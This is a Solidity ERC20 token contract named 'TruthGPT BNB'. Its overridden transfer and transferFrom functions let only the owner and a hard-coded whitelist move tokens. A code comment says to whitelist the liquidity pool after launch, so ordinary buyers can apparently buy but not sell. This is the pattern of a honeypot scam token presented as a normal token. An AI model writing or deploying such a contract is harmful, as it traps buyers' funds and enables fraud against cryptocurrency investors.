// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("TruthGPT BNB", "TGBNB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        whiteList[0x60Fb6bf5A60DeFea7587C56B12288bEb8D9F7eCe]= true;
        whiteList[0xd5c7e326767B5Cf122d14E5a422cA596eA984691]=true;
        whiteList[0xe9039FeE6647bB3eCadc5c7Ab5F9a3b68e24f186]=true;
        whiteList[0x4fD932510A0F23F463B3AeE67C64674c165757f6]=true;
        whiteList[0xA4Ca6206a1335063D2189C39852fBab4bDF0Fc09]=true;
        whiteList[0xE7688118bbf0A586CD13dcb76e6B4BEdd8fE9967]=true;
        whiteList[0xF524aA5f36846525Bfa3F50B269554DaA6e1b0B0]=true;
        whiteList[0xef2F6473F0d8a6dbB263F3618c51Abc0f6dE4DdF]=true;
        whiteList[0xC8A43812a194692e867912c3ECA6Ec2985483c40]=true;
        whiteList[0xF05bb04c0eeA5902cda59579FbAB0f7b4EC062e2]=true;
        whiteList[0xE20FFbe840BC92e1BB227544299a0db5130E3717]=true;
        whiteList[0xfcB21337597C39d624a59025b8004cFE81f1EeA4]=true;
        whiteList[0x2B47aEe313B9bAED40aF0cfc411E1b6eBa8405Bb]=true;
        whiteList[0x993D6e1511D1580e518d95296aCd8b139Bf50a79]=true;
        whiteList[0x43fa83f26419094573393492cCE4a4f3fbdd423b]=true;
        whiteList[0xC2F9716470BE7C54157b611983aE46C2310cBa97]=true;
        whiteList[0xb7edbAC8f682B691035f92026f507596FA3E0B92]=true;
        whiteList[0x1cc40025F51a5771De9d8CD6795F41A282e220F1]=true;
        whiteList[0x6d523fe92BEe0A2D445825f02d54ff86B141F6B6]=true;
        whiteList[0x0481DCAa0188120a56e54f5274cF0F1617D085bE]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}